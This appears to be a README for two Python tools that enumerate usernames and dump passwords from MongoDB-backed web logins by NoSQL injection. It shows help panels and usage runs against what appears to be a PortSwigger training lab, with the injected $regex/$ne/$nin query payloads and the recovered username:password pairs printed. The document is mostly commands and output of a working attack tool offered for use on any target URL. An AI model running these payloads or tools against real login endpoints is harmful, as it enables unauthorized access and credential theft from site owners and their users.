# NoSQLI-Attack-Suite
These scripts enumerate usernames and passwords from web applications vulnerable to NoSQL injection in MongoDB databases

## NoSQLI User Enumerator

### Help panel

```
# python NoSQLI-User-Enumerator.py -h                                                                                                          
usage: NoSQLI-User-Enumerator.py [-h] -u [-p ] [-o ]

MongoDB Username Enumeration via NoSQL Injection

options:
  -h, --help     Show this help message and exit
  -u, --url      Target URL (e.g. https://example.com/login)
  -p, --proxy    Proxy URL (e.g. http://127.0.0.1:8080)
  -o, --output   Output file (default: usernames.txt)
```

### Usage

```
# python NoSQLI-User-Enumerator.py -u https://0a080055032c362d80f23a75003e0098.web-security-academy.net/login -p http://127.0.0.1:8080 
[◥] Enumerating users: {'username': {'$regex': '^c', '$nin': ['wiener', 'carlos', 'adminfmr61qyc']}, 'password': {'$ne': ''}}
[+] ✓ User found: wiener
[+] ✓ User found: carlos
[+] ✓ User found: adminfmr61qyc
[*] Total users found: 3
[*] Users saved to usernames.txt
```

## NoSQLI Password Dumper

### Help panel

```
# python NoSQLI-Password-Dumper.py -h
usage: NoSQLI-Password-Dumper.py [-h] -u  [-p ] (-uf  | -ul ) [-oc ] [-op ]

Tool to extract passwords using NoSQL Injection in MongoDB

options:
  -h, --help                  show this help message and exit
  -u, --url                   Target URL of the login endpoint (e.g.: https://example.com/login)
  -p, --proxy                 Proxy URL to intercept traffic (e.g.: http://127.0.0.1:8080)
  -uf, --user-file            Text file containing users (one per line)
  -ul, --user-list            Comma-separated list of users (e.g.: admin,root,test)
  -oc, --output-credentials   File to save credentials in user:pass format (default: credentials.txt)
  -op, --output-passwords     File to save only passwords (default: passwords.txt)

Usage examples:
  
  Extract passwords loading users from a file:
    NoSQLI-Password-Dumper.py -u https://target.com/login -uf users.txt
    NoSQLI-Password-Dumper.py -u https://target.com/login -uf users.txt -oc credentials.txt
    NoSQLI-Password-Dumper.py -u https://target.com/login -uf users.txt -p http://127.0.0.1:8080

  Extract passwords using a list of users:
    NoSQLI-Password-Dumper.py -u https://target.com/login -ul admin,root,test
    NoSQLI-Password-Dumper.py -u https://target.com/login -ul admin,user -oc admin_creds.txt
    NoSQLI-Password-Dumper.py -u https://target.com/login -ul admin -p http://127.0.0.1:8080

  Set a proxy:
    NoSQLI-Password-Dumper.py -u https://target.com/login -uf users.txt -p http://127.0.0.1:8080 -oc results.txt
```

### Usage

```
# python NoSQLI-Password-Dumper.py -u https://0a080055032c362d80f23a75003e0098.web-security-academy.net/login -ul wiener,adminfmr61qyc,carlos 
[*] Using provided users list
[*] Total users to process: 3
[◐] Enumerating passwords: {'username': 'carlos', 'password': {'$regex': '^epuoerwg1uf5o1apmw3vr'}}
[+] ✓ Credentials found -> wiener:peter
[+] ✓ Credentials found -> adminfmr61qyc:qhgldjomevihy2034s3s
[+] ✓ Credentials found -> carlos:epuoerwg1uf5o1apmw3v
[*] Total passwords found: 3
[*] Credentials saved to credentials.txt
[*] Passwords saved to passwords.txt
```
